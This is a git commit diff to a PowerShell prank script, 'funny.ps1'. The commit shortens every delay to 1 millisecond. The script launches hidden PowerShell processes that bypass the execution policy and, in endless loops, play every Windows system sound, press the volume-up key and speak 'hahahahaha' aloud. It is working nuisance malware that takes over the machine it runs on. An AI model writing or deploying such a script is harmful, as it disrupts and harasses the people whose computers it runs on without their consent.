59b580ae96944d430f43e83ed27a597316f6e5d6
Katelyn <101859007+KateTheStargazer@users.noreply.github.com>
2025-04-08 21:34:06 -0400

    Update funny.ps1

--- funny.ps1
+++ funny.ps1
@@ -1,10 +1,10 @@
 $notificationScriptContent = @'
 Function Send-NotificationSoundSpam {
-    param ([int]$Interval = 4)
+    param ([int]$Interval = 0)
     
     Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | ForEach-Object {
         (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").PlaySync()
-        Start-Sleep -Seconds $Interval
+        Start-Sleep -Milliseconds 1
     }
 }
 
@@ -17,7 +17,7 @@ $trayScriptContent = @'
 $WScript = New-Object -com wscript.shell
 while ($true) {
     $WScript.SendKeys([char]175)
-    Start-Sleep -Seconds 1
+    Start-Sleep -Milliseconds 1
 }
 '@
 $trayScriptPath = "$PWD\tray.ps1"
@@ -28,16 +28,14 @@ Add-Type -AssemblyName System.Speech
 $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
 while ($true) {
     $speak.Speak("hahahahaha")
-    Start-Sleep -Seconds 3
+    Start-Sleep -Milliseconds 1
 }
 '@
 $speechScriptPath = "$PWD\speech.ps1"
 Set-Content -Path $speechScriptPath -Value $speechScriptContent
 
 Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$speechScriptPath`""
-
 Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$notificationScriptPath`""
-
 Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$trayScriptPath`""
 
 $WScript = New-Object -com wscript.shell
